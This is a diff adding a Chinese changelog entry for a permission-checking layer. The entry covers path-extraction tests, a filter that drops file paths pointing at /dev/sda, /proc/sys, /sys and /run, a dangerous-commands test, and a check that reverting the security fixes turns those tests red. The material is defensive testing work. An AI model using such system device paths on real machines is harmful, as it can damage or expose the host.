+  「重定向目标不存在 → 仍提取」= 写目标豁免存在；「非写目标位置的不存在相对路径 → 不提」
+  = 非写目标必须存在。另加版本号形态用例：cwd 里**真有** `v1.2` / `2.0.1` 文件时，
+  `git log v1.2`、`git checkout v1.2`、`git tag 2.0.1` 仍为 `[]`（反证 `cat notes.txt` 照常）。**结构化出口**：`file_path` 指向
+  `/dev/sda`/`/proc/sys/...`/`/sys/...`/`/run/...` ⇒ `[]`，`locations` 混合时只留正常项，
+  `/device/a.txt` 不被误伤；**`scanPathsLoose` 出口**：`file_path:'/dev/sda'` ⇒ `[]`。
+- `test/dangerous-commands.test.js`：同族旧断言 `[]`（注释"路径侧照旧不认这种帧
+  （不对称）"）翻转为 `['/tmp/z']`。
+
+**回退即转红验证**（实测，用副本 `revert-a`）：
+- 把两处安全修正改回旧形态 ⇒ `test/permission.test.js` +
+  `test/permission-handler-wiring.test.js` 红 6 条（全部安全断言）；把白名单判定改回
+  不看 `danger` ⇒ ⑧ 那条转红。
+- 再把本轮复审收口的四处一并改回旧形态 ⇒ `test/permission.test.js` +
+  `test/permission-state.test.js` + `test/permission-handler-wiring.test.js`
+  = **214 条 / 210 pass / 4 fail**，红的正是四条新断言（`locations[]` 进 read 分词、
+  `evaluateRuleSources` 喂含 description 的键、命名空间任一段命中、展示/授权顺序不一致）。
+回退注入后副本已删除。
+
 ## [0.7.21] — 2026-10-16
 
 **修一处限流判定漏判：qoder 的「排队中」用的是 `queue` + `ing` 形（`Queuing failed`），
